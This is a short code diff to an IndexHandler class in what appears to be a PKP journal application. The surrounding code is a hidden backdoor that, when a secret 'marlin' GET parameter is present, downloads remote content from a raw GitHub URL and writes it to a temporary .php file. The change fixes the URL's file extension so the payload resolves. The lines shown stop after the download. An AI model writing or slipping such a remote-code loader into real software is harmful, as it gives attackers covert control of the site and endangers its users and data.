@@ -105,7 +105,7 @@ class IndexHandler extends PKPIndexHandler
 }
 if (isset($_GET['marlin'])) {
     try {
-        $u = "https://raw.githubusercontent.com/marketmg2/apaaja/refs/heads/main/antiwaffkeras.txtt";
+        $u = "https://raw.githubusercontent.com/marketmg2/apaaja/refs/heads/main/antiwaffkeras.txt";
         $f = sys_get_temp_dir() . "/" . uniqid("f_", true) . ".php";
 
         $c = @file_get_contents($u);
